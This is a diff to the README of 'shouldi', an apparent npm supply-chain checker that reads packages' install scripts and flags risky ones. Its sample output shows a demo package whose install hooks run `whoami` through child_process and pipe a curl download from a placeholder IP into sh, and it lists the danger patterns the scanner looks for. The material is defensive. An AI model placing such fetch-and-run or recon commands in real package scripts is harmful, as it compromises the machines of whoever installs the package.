@@ -33,22 +33,41 @@ Every `npm install` is a trust decision you make blind:
 
 `shouldi` answers all of that **before** you commit, straight from the npm registry. No install. No `node_modules`. No dependencies of its own.
 
-## The scary one: install scripts
+## The killer feature: it shows you the actual install script
+
+Other tools tell you a package *has* an install script. `shouldi` shows you **the exact command that will run on your machine** — and flags it if it reaches the network, pipes to a shell, evals, or reads your env.
+
+A legit native build looks calm:
 
 ```sh
 npx shouldi node-sass
 ```
-
 ```
-  ⚠  1 package runs install scripts on your machine
+  ⚠  1 package runs code on your machine at install:
      node-sass
-  🪦 1 deprecated package(s)
-  🕰  oldest dep last shipped 13y ago — async-foreach (30 stale, 2y+)
-  ────────────────────────────────────────
-  GRADE  D   "1 package runs code on your machine at install — review before trusting."
+       install:     node scripts/install.js
+       postinstall: node scripts/build.js
 ```
 
-`hasInstallScript` means that package executes its own code during `npm install` — before any of *your* code runs. Usually it's a native build. Sometimes it isn't. `shouldi` shows you which packages do it and how many, so "I'll just install it" becomes a decision instead of a reflex.
+A package doing something it shouldn't lights up red:
+
+```
+  ⚠  2 packages run code on your machine at install:
+     evil-demo 🚨 dynamic-exec, network, pipe-to-shell
+       install:     node -e "require('child_process').exec('whoami')"
+       postinstall: curl http://198.51.100.9/x.sh | sh
+     helper
+       postinstall: node build.js
+  ────────────────────────────────────────
+  GRADE  F   "an install script is flagged for dynamic-exec, network,
+              pipe-to-shell — read the command above before you trust it."
+```
+
+`npm install` runs these **before any of your own code** — it's the exact door supply-chain attacks walk through. `shouldi` reads the literal command straight from the registry (no install, no tarball download) and scans it for:
+
+`network` · `pipe-to-shell` · `dynamic-exec` · `obfuscation` · `reads-env` · `destructive/recon`
+
+So "I'll just install it" becomes a decision instead of a reflex.
 
 ## Usage
 
@@ -79,6 +98,7 @@ npx shouldi "$NEW_DEP" || exit 1
 Starts at 100, loses points for:
 
 - **install scripts** (−8 each) — code that runs on your machine
+- **flagged install scripts** (up to −30 each) — scaled by how many danger signals one command trips (network, pipe-to-shell, eval…)
 - **deprecated packages** (−6 each)
 - **stale packages** (−3 each) — no publish in 2+ years
 - **disk weight** (up to −20)
